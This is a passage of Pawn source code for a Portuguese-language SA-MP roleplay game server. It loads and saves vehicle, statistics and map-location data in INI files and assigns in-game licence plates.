  			DOF2_SetInt(ficheiro, "mod2", 0);
  			DOF2_SetInt(ficheiro, "mod3", 0);
  			DOF2_SetInt(ficheiro, "mod4", 0);
  			DOF2_SetInt(ficheiro, "mod5", 0);
  			DOF2_SetInt(ficheiro, "mod6", 0);
  			DOF2_SetInt(ficheiro, "mod7", 0);
  			DOF2_SetInt(ficheiro, "mod8", 0);
  			DOF2_SetInt(ficheiro, "mod9", 0);
  			DOF2_SetInt(ficheiro, "mod10", 0);
  			DOF2_SetInt(ficheiro, "mod11", 0);
  			DOF2_SetInt(ficheiro, "Apreendido", 0);
  			DOF2_SetInt(ficheiro, "Arma1", 0);
  			DOF2_SetInt(ficheiro, "Ammo1", 0);
  			DOF2_SetInt(ficheiro, "Arma2", 0);
  			DOF2_SetInt(ficheiro, "Ammo2", 0);
  			DOF2_SetInt(ficheiro, "Arma3", 0);
  			DOF2_SetInt(ficheiro, "Ammo3", 0);
  			DOF2_SetString(ficheiro, "Prop", "Ninguém");
  			DOF2_SetString(ficheiro, "CompradoEm", "null");
  			DOF2_SetInt(ficheiro, "RadioStatus", 0);
  			DOF2_SetInt(ficheiro, "IsCaravana", 0);
  			DOF2_SetInt(ficheiro, "CaravanaCasaID", 0);
  			DOF2_SetInt(ficheiro, "Panels", 0);
  			DOF2_SetInt(ficheiro, "Doors", 0);
  			DOF2_SetInt(ficheiro, "Lights", 0);
  			DOF2_SetInt(ficheiro, "Tires", 0);
  			
    		DOF2_SaveFile();
   		}
   		else
   		{
   		    cInfo[i][ID] = DOF2_GetInt(ficheiro, "ID");
   		    cInfo[i][Model] = DOF2_GetInt(ficheiro, "Model");
   		    cInfo[i][X] = DOF2_GetFloat(ficheiro, "X");
   		    cInfo[i][Y] = DOF2_GetFloat(ficheiro, "Y");
   		    cInfo[i][Z] = DOF2_GetFloat(ficheiro, "Z");
   		    cInfo[i][Angle] = DOF2_GetFloat(ficheiro, "Angle");
   		    cInfo[i][Color1] = DOF2_GetInt(ficheiro, "Color1");
   		    cInfo[i][Color2] = DOF2_GetInt(ficheiro, "Color2");
   		    cInfo[i][Faction] = DOF2_GetInt(ficheiro, "Faction");
   		    cInfo[i][Type] = DOF2_GetInt(ficheiro, "Type");
   		    cInfo[i][Comprado] = DOF2_GetInt(ficheiro, "Comprado");
   		    cInfo[i][Travao] = DOF2_GetInt(ficheiro, "Travao");
   		    cInfo[i][Kilometros] = DOF2_GetInt(ficheiro, "Kilometros");
   		    cInfo[i][Metros] = DOF2_GetInt(ficheiro, "Metros");
   		    cInfo[i][Neon] = DOF2_GetInt(ficheiro, "Neon");
   		    cInfo[i][NeonStatus] = DOF2_GetInt(ficheiro, "NeonStatus");
   		    cInfo[i][Gasolina] = DOF2_GetInt(ficheiro, "Gasolina");
   		    cInfo[i][Trancado] = DOF2_GetInt(ficheiro, "Trancado");
   		    cInfo[i][Vida] = DOF2_GetFloat(ficheiro, "Vida");
   		    cInfo[i][mod1] = DOF2_GetInt(ficheiro, "mod1");
   		    cInfo[i][mod2] = DOF2_GetInt(ficheiro, "mod2");
   		    cInfo[i][mod3] = DOF2_GetInt(ficheiro, "mod3");
   		    cInfo[i][mod4] = DOF2_GetInt(ficheiro, "mod4");
   		    cInfo[i][mod5] = DOF2_GetInt(ficheiro, "mod5");
   		    cInfo[i][mod6] = DOF2_GetInt(ficheiro, "mod6");
   		    cInfo[i][mod7] = DOF2_GetInt(ficheiro, "mod7");
   		    cInfo[i][mod8] = DOF2_GetInt(ficheiro, "mod8");
   		    cInfo[i][mod9] = DOF2_GetInt(ficheiro, "mod9");
     		cInfo[i][mod10] = DOF2_GetInt(ficheiro, "mod10");
     		cInfo[i][mod11] = DOF2_GetInt(ficheiro, "mod11");
   		    cInfo[i][Apreendido] = DOF2_GetInt(ficheiro, "Apreendido");
   		    cInfo[i][Arma1] = DOF2_GetInt(ficheiro, "Arma1");
   		    cInfo[i][Ammo1] = DOF2_GetInt(ficheiro, "Ammo1");
   		    cInfo[i][Arma2] = DOF2_GetInt(ficheiro, "Arma2");
   		    cInfo[i][Ammo2] = DOF2_GetInt(ficheiro, "Ammo2");
   		    cInfo[i][Arma3] = DOF2_GetInt(ficheiro, "Arma3");
   		    cInfo[i][Ammo3] = DOF2_GetInt(ficheiro, "Ammo3");
   		    format(cInfo[i][Prop], 32, "%s", DOF2_GetString(ficheiro, "Prop"));
   		    format(cInfo[i][CompradoEm], 32, "%s", DOF2_GetString(ficheiro, "CompradoEm"));
   		    cInfo[i][RadioStatus] = DOF2_GetInt(ficheiro, "RadioStatus");
   		    cInfo[i][IsCaravana] = DOF2_GetInt(ficheiro, "IsCaravana");
   		    cInfo[i][CaravanaCasaID] = DOF2_GetInt(ficheiro, "CaravanaCasaID");
   		    cInfo[i][Panels] = DOF2_GetInt(ficheiro, "Panels");
   		    cInfo[i][Doors] = DOF2_GetInt(ficheiro, "Doors");
   		    cInfo[i][Lights] = DOF2_GetInt(ficheiro, "Lights");
   		    cInfo[i][Tires] = DOF2_GetInt(ficheiro, "Tires");

   			cInfo[i][ID] = CreateVehicle(cInfo[i][Model], cInfo[i][X], cInfo[i][Y], cInfo[i][Z], cInfo[i][Angle], cInfo[i][Color1], cInfo[i][Color2], -1, IsACopCar(cInfo[i][Model]) ? 1 : 0);
			SetVehicleVirtualWorld(cInfo[i][ID], cInfo[i][VirtualWorld]);
			LinkVehicleToInterior(cInfo[i][ID], cInfo[i][Interior]);
			AtualizarDanosCarro(i);
         	AtualizarTunning(i);
         	
         	SetVehicleHealth(i, cInfo[i][Vida]);
         	MatriculasAtualizar();
         	
         	format(mat, sizeof(mat), "{FFAE00}[ {FFFFFF}%s {FFAE00}]", cInfo[i][Matricula]);
         	Matricula3DText[i] = Create3DTextLabel(mat, -1, 0.0, 0.0, 0.0, 3.5, 0, 1);
         	
         	Attach3DTextLabelToVehicle(Matricula3DText[i], cInfo[i][ID], 0.0, 0.0, 0.1);
         	
         	SetVehicleParamsEx(i, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF);
		}
	}
	
	tick2 = GetTickCount();
	printf("\n [PC:RP] Carros carregados (%d ms)", tick2-tick1);

	return 1;
}

public GuardarCarros()
{
	new ficheiro[64];
	for(new i = 0; i < MAX_CARROS; i++)
	{
	    if(i == 0) continue;
	    format(ficheiro, sizeof(ficheiro), "PCRP/Carros/%d.ini", i);

		DOF2_SetInt(ficheiro, "ID", cInfo[i][ID]);
		DOF2_SetInt(ficheiro, "Model", cInfo[i][Model]);
		DOF2_SetFloat(ficheiro, "X", cInfo[i][X]);
		DOF2_SetFloat(ficheiro, "Y", cInfo[i][Y]);
		DOF2_SetFloat(ficheiro, "Z", cInfo[i][Z]);
        DOF2_SetFloat(ficheiro, "Angle", cInfo[i][Angle]);
        DOF2_SetInt(ficheiro, "Color1", cInfo[i][Color1]);
        DOF2_SetInt(ficheiro, "Color2", cInfo[i][Color2]);
        DOF2_SetInt(ficheiro, "Faction", cInfo[i][Faction]);
        DOF2_SetInt(ficheiro, "Type", cInfo[i][Type]);
        DOF2_SetInt(ficheiro, "Comprado", cInfo[i][Comprado]);
		DOF2_SetInt(ficheiro, "Travao", cInfo[i][Travao]);
		DOF2_SetInt(ficheiro, "Kilometros", cInfo[i][Kilometros]);
		DOF2_SetInt(ficheiro, "Metros", cInfo[i][Metros]);
		DOF2_SetInt(ficheiro, "Neon", cInfo[i][Neon]);
		DOF2_SetInt(ficheiro, "NeonStatus", cInfo[i][NeonStatus]);
		DOF2_SetInt(ficheiro, "Gasolina", cInfo[i][Gasolina]);
        DOF2_SetInt(ficheiro, "Trancado", cInfo[i][Trancado]);
		DOF2_SetFloat(ficheiro, "Vida", cInfo[i][Vida]);
		DOF2_SetInt(ficheiro, "mod1", cInfo[i][mod1]);
		DOF2_SetInt(ficheiro, "mod2", cInfo[i][mod2]);
		DOF2_SetInt(ficheiro, "mod3", cInfo[i][mod3]);
		DOF2_SetInt(ficheiro, "mod4", cInfo[i][mod4]);
		DOF2_SetInt(ficheiro, "mod5", cInfo[i][mod5]);
		DOF2_SetInt(ficheiro, "mod6", cInfo[i][mod6]);
		DOF2_SetInt(ficheiro, "mod7", cInfo[i][mod7]);
		DOF2_SetInt(ficheiro, "mod8", cInfo[i][mod8]);
		DOF2_SetInt(ficheiro, "mod9", cInfo[i][mod9]);
		DOF2_SetInt(ficheiro, "mod10", cInfo[i][mod10]);
		DOF2_SetInt(ficheiro, "mod11", cInfo[i][mod11]);
		DOF2_SetInt(ficheiro, "Apreendido", cInfo[i][Apreendido]);
		DOF2_SetInt(ficheiro, "Arma1", cInfo[i][Arma1]);
		DOF2_SetInt(ficheiro, "Ammo1", cInfo[i][Ammo1]);
		DOF2_SetInt(ficheiro, "Arma2", cInfo[i][Arma2]);
		DOF2_SetInt(ficheiro, "Ammo2", cInfo[i][Ammo2]);
		DOF2_SetInt(ficheiro, "Arma3", cInfo[i][Arma3]);
		DOF2_SetInt(ficheiro, "Ammo3", cInfo[i][Ammo3]);
		DOF2_SetString(ficheiro, "Prop", cInfo[i][Prop]);
		DOF2_SetString(ficheiro, "CompradoEm", cInfo[i][CompradoEm]);
		DOF2_SetInt(ficheiro, "RadioStatus", cInfo[i][RadioStatus]);
		DOF2_SetInt(ficheiro, "IsCaravana", cInfo[i][IsCaravana]);
		DOF2_SetInt(ficheiro, "CaravanaCasaID", cInfo[i][CaravanaCasaID]);
		DOF2_SetInt(ficheiro, "Panels", cInfo[i][Panels]);
		DOF2_SetInt(ficheiro, "Doors", cInfo[i][Doors]);
		DOF2_SetInt(ficheiro, "Lights", cInfo[i][Lights]);
		DOF2_SetInt(ficheiro, "Tires", cInfo[i][Tires]);
		
		DOF2_SaveFile();

	}
	return 1;
}

public GuardarCarro(id)
{
	new ficheiro[64];
	new i = id;
	
 	format(ficheiro, sizeof(ficheiro), "PCRP/Carros/%d.ini", i);

	DOF2_SetInt(ficheiro, "ID", cInfo[i][ID]);
	DOF2_SetInt(ficheiro, "Model", cInfo[i][Model]);
	DOF2_SetFloat(ficheiro, "X", cInfo[i][X]);
	DOF2_SetFloat(ficheiro, "Y", cInfo[i][Y]);
	DOF2_SetFloat(ficheiro, "Z", cInfo[i][Z]);
 	DOF2_SetFloat(ficheiro, "Angle", cInfo[i][Angle]);
 	DOF2_SetInt(ficheiro, "Color1", cInfo[i][Color1]);
 	DOF2_SetInt(ficheiro, "Color2", cInfo[i][Color2]);
  	DOF2_SetInt(ficheiro, "Faction", cInfo[i][Faction]);
   	DOF2_SetInt(ficheiro, "Type", cInfo[i][Type]);
   	DOF2_SetInt(ficheiro, "Comprado", cInfo[i][Comprado]);
	DOF2_SetInt(ficheiro, "Travao", cInfo[i][Travao]);
	DOF2_SetInt(ficheiro, "Kilometros", cInfo[i][Kilometros]);
	DOF2_SetInt(ficheiro, "Metros", cInfo[i][Metros]);
	DOF2_SetInt(ficheiro, "Neon", cInfo[i][Neon]);
	DOF2_SetInt(ficheiro, "NeonStatus", cInfo[i][NeonStatus]);
	DOF2_SetInt(ficheiro, "Gasolina", cInfo[i][Gasolina]);
	DOF2_SetInt(ficheiro, "Trancado", cInfo[i][Trancado]);
	DOF2_SetFloat(ficheiro, "Vida", cInfo[i][Vida]);
	DOF2_SetInt(ficheiro, "mod1", cInfo[i][mod1]);
	DOF2_SetInt(ficheiro, "mod2", cInfo[i][mod2]);
	DOF2_SetInt(ficheiro, "mod3", cInfo[i][mod3]);
	DOF2_SetInt(ficheiro, "mod4", cInfo[i][mod4]);
	DOF2_SetInt(ficheiro, "mod5", cInfo[i][mod5]);
	DOF2_SetInt(ficheiro, "mod6", cInfo[i][mod6]);
	DOF2_SetInt(ficheiro, "mod7", cInfo[i][mod7]);
	DOF2_SetInt(ficheiro, "mod8", cInfo[i][mod8]);
	DOF2_SetInt(ficheiro, "mod9", cInfo[i][mod9]);
	DOF2_SetInt(ficheiro, "mod10", cInfo[i][mod10]);
	DOF2_SetInt(ficheiro, "mod11", cInfo[i][mod11]);
	DOF2_SetInt(ficheiro, "Apreendido", cInfo[i][Apreendido]);
	DOF2_SetInt(ficheiro, "Arma1", cInfo[i][Arma1]);
	DOF2_SetInt(ficheiro, "Ammo1", cInfo[i][Ammo1]);
	DOF2_SetInt(ficheiro, "Arma2", cInfo[i][Arma2]);
	DOF2_SetInt(ficheiro, "Ammo2", cInfo[i][Ammo2]);
	DOF2_SetInt(ficheiro, "Arma3", cInfo[i][Arma3]);
	DOF2_SetInt(ficheiro, "Ammo3", cInfo[i][Ammo3]);
	DOF2_SetString(ficheiro, "Prop", cInfo[i][Prop]);
	DOF2_SetString(ficheiro, "CompradoEm", cInfo[i][CompradoEm]);
	DOF2_SetInt(ficheiro, "RadioStatus", cInfo[i][RadioStatus]);
	DOF2_SetInt(ficheiro, "IsCaravana", cInfo[i][IsCaravana]);
	DOF2_SetInt(ficheiro, "CaravanaCasaID", cInfo[i][CaravanaCasaID]);
	DOF2_SetInt(ficheiro, "Panels", cInfo[i][Panels]);
	DOF2_SetInt(ficheiro, "Doors", cInfo[i][Doors]);
	DOF2_SetInt(ficheiro, "Lights", cInfo[i][Lights]);
	DOF2_SetInt(ficheiro, "Tires", cInfo[i][Tires]);

	DOF2_SaveFile();

	return 1;
}

public MatriculasAtualizar()
{
    new message[9];
	for(new c = 0; c < MAX_CARROS; c++)
	{
		if(c <= 9)
		{
	     	format(message,sizeof(message), "0%d-SV-00",c);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 10 && c <= 99)
		{
	     	format(message,sizeof(message), "%d-RP-00",c);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 100 && c <= 109)
		{
	     	format(message,sizeof(message), "0%d-PT-01",c-100);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 110 && c <= 199)
		{
	     	format(message,sizeof(message), "%d-SA-01",c-100);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 200 && c <= 209)
		{
	     	format(message,sizeof(message), "0%d-MP-02",c-200);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 210 && c <= 299)
		{
	     	format(message,sizeof(message), "%d-GT-02",c-200);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 300 && c <= 309)
		{
	     	format(message,sizeof(message), "0%d-PF-03",c-300);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 310 && c <= 399)
		{
	     	format(message,sizeof(message), "%d-FM-03",c-300);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 400 && c <= 409)
		{
	     	format(message,sizeof(message), "0%d-AG-04",c-400);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 410 && c <= 499)
		{
	     	format(message,sizeof(message), "%d-FC-04",c-400);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 500 && c <= 509)
		{
	     	format(message,sizeof(message), "0%d-TT-05",c-500);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 510 && c <= 599)
		{
	     	format(message,sizeof(message), "%d-XU-05",c-500);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 600 && c <= 609)
		{
	     	format(message,sizeof(message), "0%d-FL-06",c-600);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 610 && c <= 699)
		{
	     	format(message,sizeof(message), "%d-AH-06",c-600);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 700 && c <= 709)
		{
	     	format(message,sizeof(message), "0%d-PU-07",c-700);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 710 && c <= 799)
		{
	     	format(message,sizeof(message), "%d-KG-07",c-700);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 800 && c <= 809)
		{
	     	format(message,sizeof(message), "0%d-UF-08",c-800);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 810 && c <= 899)
		{
	     	format(message,sizeof(message), "%d-TY-08",c-800);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 900 && c <= 909)
		{
	     	format(message,sizeof(message), "0%d-PD-09",c-900);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
		if(c >= 910 && c <= 999)
		{
	     	format(message,sizeof(message), "%d-HE-09",c-900);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1000 && c <= 1009)
		{
	     	format(message,sizeof(message), "0%d-QD-10",c-1000);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1010 && c <= 1099)
		{
	     	format(message,sizeof(message), "%d-IU-10",c-1000);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1100 && c <= 1109)
		{
	     	format(message,sizeof(message), "0%d-EY-11",c-1100);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1110 && c <= 1199)
		{
	     	format(message,sizeof(message), "%d-EG-11",c-1100);
	     	SetVehicleNumberPlate(c, message);
     	}
     	if(c >= 1200 && c <= 1209)
		{
	     	format(message,sizeof(message), "0%d-AJ-12",c-1200);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1210 && c <= 1299)
		{
	     	format(message,sizeof(message), "%d-AK-12",c-1200);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1300 && c <= 1309)
		{
	     	format(message,sizeof(message), "0%d-ZK-13",c-1300);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1310 && c <= 1399)
		{
	     	format(message,sizeof(message), "%d-QL-13",c-1300);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1400 && c <= 1409)
		{
	     	format(message,sizeof(message), "0%d-JE-14",c-1400);
	     	SetVehicleNumberPlate(c, message);

			cInfo[c][Matricula] = message;
     	}
     	if(c >= 1410 && c <= 1499)
		{
	     	format(message,sizeof(message), "%d-CR-14",c-1400);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1500 && c <= 1509)
		{
	     	format(message,sizeof(message), "0%d-ZA-15",c-1500);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1510 && c <= 1599)
		{
	     	format(message,sizeof(message), "%d-DW-15",c-1500);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1600 && c <= 1609)
		{
	     	format(message,sizeof(message), "0%d-OR-16",c-1600);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1610 && c <= 1699)
		{
	     	format(message,sizeof(message), "%d-TH-16",c-1600);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1700 && c <= 1709)
		{
	     	format(message,sizeof(message), "0%d-DK-17",c-1700);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1710 && c <= 1799)
		{
	     	format(message,sizeof(message), "%d-DO-17",c-1700);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1800 && c <= 1809)
		{
	     	format(message,sizeof(message), "0%d-LI-18",c-1800);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1810 && c <= 1899)
		{
	     	format(message,sizeof(message), "%d-DW-18",c-1800);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1900 && c <= 1909)
		{
	     	format(message,sizeof(message), "0%d-ZJ-19",c-1900);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c >= 1910 && c <= 1999)
		{
	     	format(message,sizeof(message), "%d-GP-19",c-1900);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
     	if(c == 2000)
		{
	     	format(message,sizeof(message), "%d-ZE-20",c-2000);
	     	SetVehicleNumberPlate(c, message);
	     	
	     	cInfo[c][Matricula] = message;
     	}
	}
	return 1;
}

public CarregarStats()
{
	new ficheiro[64];
	new tick1;
	new tick2;

	tick1 = GetTickCount();

	format(ficheiro, sizeof(ficheiro), "PCRP/Outros/Stats.ini");

	if(!DOF2_FileExists(ficheiro))
	{
		DOF2_CreateFile(ficheiro);
		
		DOF2_SetInt(ficheiro, "JoinCount", 0);
		DOF2_SetInt(ficheiro, "MinutesPlayed", 0);
		DOF2_SetInt(ficheiro, "Ajudas", 0);
		DOF2_SetInt(ficheiro, "Comandos", 0);
		DOF2_SetInt(ficheiro, "AJs", 0);
		DOF2_SetInt(ficheiro, "Kicks", 0);
		DOF2_SetInt(ficheiro, "Bans", 0);
		DOF2_SetInt(ficheiro, "Rotas", 0);
		DOF2_SetInt(ficheiro, "VIPs", 0);
		DOF2_SetInt(ficheiro, "CarrosComprados", 0);
		DOF2_SetInt(ficheiro, "PMs", 0);

		DOF2_SaveFile();
	}
	else
	{
        sStats[0][JoinCount] = DOF2_GetInt(ficheiro, "JoinCount");
        sStats[0][MinutesPlayed] = DOF2_GetInt(ficheiro, "MinutesPlayed");
        sStats[0][Ajudas] = DOF2_GetInt(ficheiro, "Ajudas");
        sStats[0][Comandos] = DOF2_GetInt(ficheiro, "Comandos");
        sStats[0][AJs] = DOF2_GetInt(ficheiro, "AJs");
        sStats[0][Kicks] = DOF2_GetInt(ficheiro, "Kicks");
        sStats[0][Bans] = DOF2_GetInt(ficheiro, "Bans");
        sStats[0][Rotas] = DOF2_GetInt(ficheiro, "Rotas");
        sStats[0][VIPs] = DOF2_GetInt(ficheiro, "VIPs");
        sStats[0][CarrosComprados] = DOF2_GetInt(ficheiro, "CarrosComprados");
        sStats[0][PMs] = DOF2_GetInt(ficheiro, "PMs");
	}

	tick2 = GetTickCount();
	printf("\n [PC:RP] Stats carregados (%d ms)", oInfo[0][RegistoCounter], tick2-tick1);

	return 1;
}

public GuardarStats()
{
	new ficheiro[64];

	format(ficheiro, sizeof(ficheiro), "PCRP/Outros/Stats.ini");
	
	DOF2_SetInt(ficheiro, "JoinCount", sStats[0][JoinCount]);
	DOF2_SetInt(ficheiro, "MinutesPlayed", sStats[0][MinutesPlayed]);
	DOF2_SetInt(ficheiro, "Ajudas", sStats[0][Ajudas]);
	DOF2_SetInt(ficheiro, "Comandos", sStats[0][Comandos]);
	DOF2_SetInt(ficheiro, "AJs", sStats[0][AJs]);
	DOF2_SetInt(ficheiro, "Kicks", sStats[0][Kicks]);
	DOF2_SetInt(ficheiro, "Bans", sStats[0][Bans]);
	DOF2_SetInt(ficheiro, "Rotas", sStats[0][Rotas]);
	DOF2_SetInt(ficheiro, "VIPs", sStats[0][VIPs]);
	DOF2_SetInt(ficheiro, "CarrosComprados", sStats[0][CarrosComprados]);
	DOF2_SetInt(ficheiro, "PMs", sStats[0][PMs]);
	

	DOF2_SaveFile();

	return 1;
}

public CarregarOutros()
{
	new ficheiro[64];
	new tick1;
	new tick2;

	tick1 = GetTickCount();

	format(ficheiro, sizeof(ficheiro), "PCRP/Outros/Outros.ini");
	
	if(!DOF2_FileExists(ficheiro))
	{
		DOF2_CreateFile(ficheiro);

		DOF2_SetInt(ficheiro, "RegistoCounter", 0);
		DOF2_SetFloat(ficheiro, "LicX", 0);
		DOF2_SetFloat(ficheiro, "LicY", 0);
		DOF2_SetFloat(ficheiro, "LicZ", 0);
		DOF2_SetInt(ficheiro, "LicPickupID", 1239);
		DOF2_SetInt(ficheiro, "LicVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "LicInterior", 0);
		DOF2_SetFloat(ficheiro, "EmpregoX", 0);
		DOF2_SetFloat(ficheiro, "EmpregoY", 0);
		DOF2_SetFloat(ficheiro, "EmpregoZ", 0);
		DOF2_SetInt(ficheiro, "EmpregoPickupID", 1239);
		DOF2_SetInt(ficheiro, "EmpregoVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "EmpregoInterior", 0);
		DOF2_SetFloat(ficheiro, "PrenderX", 0);
		DOF2_SetFloat(ficheiro, "PrenderY", 0);
		DOF2_SetFloat(ficheiro, "PrenderZ", 0);
		DOF2_SetInt(ficheiro, "PrenderVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "PrenderInterior", 0);
		DOF2_SetInt(ficheiro, "Impostos", 0);
		DOF2_SetInt(ficheiro, "FundoDesemprego", 0);
		DOF2_SetFloat(ficheiro, "ComprarDrogasX", 0);
		DOF2_SetFloat(ficheiro, "ComprarDrogasY", 0);
		DOF2_SetFloat(ficheiro, "ComprarDrogasZ", 0);
		DOF2_SetInt(ficheiro, "ComprarDrogasVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "ComprarDrogasInterior", 0);
		DOF2_SetFloat(ficheiro, "ComprarMateriaisX", 0);
		DOF2_SetFloat(ficheiro, "ComprarMateriaisY", 0);
		DOF2_SetFloat(ficheiro, "ComprarMateriaisZ", 0);
		DOF2_SetInt(ficheiro, "ComprarMateriaisVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "ComprarMateriaisInterior", 0);
		DOF2_SetFloat(ficheiro, "EntregarDrogasX", 0);
		DOF2_SetFloat(ficheiro, "EntregarDrogasY", 0);
		DOF2_SetFloat(ficheiro, "EntregarDrogasZ", 0);
		DOF2_SetInt(ficheiro, "EntregarDrogasVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "EntregarDrogasInterior", 0);
		DOF2_SetFloat(ficheiro, "EntregarMateriaisX", 0);
		DOF2_SetFloat(ficheiro, "EntregarMateriaisY", 0);
		DOF2_SetFloat(ficheiro, "EntregarMateriaisZ", 0);
		DOF2_SetInt(ficheiro, "EntregarMateriaisVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "EntregarMateriaisInterior", 0);
		DOF2_SetFloat(ficheiro, "TunningX", 0);
		DOF2_SetFloat(ficheiro, "TunningY", 0);
		DOF2_SetFloat(ficheiro, "TunningZ", 0);
		DOF2_SetInt(ficheiro, "TunningVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "TunningInterior", 0);
		DOF2_SetInt(ficheiro, "TunningPickupID", 1239);
		DOF2_SetFloat(ficheiro, "Banco1X", 0);
		DOF2_SetFloat(ficheiro, "Banco1Y", 0);
		DOF2_SetFloat(ficheiro, "Banco1Z", 0);
		DOF2_SetInt(ficheiro, "Banco1PickupID", 1239);
		DOF2_SetInt(ficheiro, "Banco1VirtualWorld", 0);
		DOF2_SetInt(ficheiro, "Banco1Interior", 0);
		DOF2_SetFloat(ficheiro, "Banco2X", 0);
		DOF2_SetFloat(ficheiro, "Banco2Y", 0);
		DOF2_SetFloat(ficheiro, "Banco2Z", 0);
		DOF2_SetInt(ficheiro, "Banco2VirtualWorld", 0);
		DOF2_SetInt(ficheiro, "Banco2Interior", 0);
        DOF2_SetInt(ficheiro, "Banco2PickupID", 1239);
        DOF2_SetInt(ficheiro, "PrecoAtestarG", 1);
		DOF2_SetFloat(ficheiro, "PoliciaX", 0);
		DOF2_SetFloat(ficheiro, "PoliciaY", 0);
		DOF2_SetFloat(ficheiro, "PoliciaZ", 0);
		DOF2_SetInt(ficheiro, "PoliciaVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "PoliciaInterior", 0);
		DOF2_SetInt(ficheiro, "PoliciaPickupID", 1239);
		DOF2_SetFloat(ficheiro, "ApreendidosX", 2329.2659);
		DOF2_SetFloat(ficheiro, "ApreendidosY", 2445.7922);
		DOF2_SetFloat(ficheiro, "ApreendidosZ", 4.4461);
		DOF2_SetFloat(ficheiro, "ApreendidosA", 85.0567);
		DOF2_SetInt(ficheiro, "ApreendidosVirtualWorld", 1);
		DOF2_SetInt(ficheiro, "ApreendidosInterior", 0);
		DOF2_SetFloat(ficheiro, "EntradaApreendidosX", 0);
		DOF2_SetFloat(ficheiro, "EntradaApreendidosY", 0);
		DOF2_SetFloat(ficheiro, "EntradaApreendidosZ", 0);
		DOF2_SetFloat(ficheiro, "EntradaApreendidosA", 0);
		DOF2_SetInt(ficheiro, "EntradaApreendidosVirtualWorld", 0);
		DOF2_SetInt(ficheiro, "EntradaApreendidosInterior", 0);
		DOF2_SetFloat(ficheiro, "VenderVeiculoX", 0);
		DOF2_SetFloat(ficheiro, "VenderVeiculoY", 0);
		DOF2_SetFloat(ficheiro, "VenderVeiculoZ", 0);
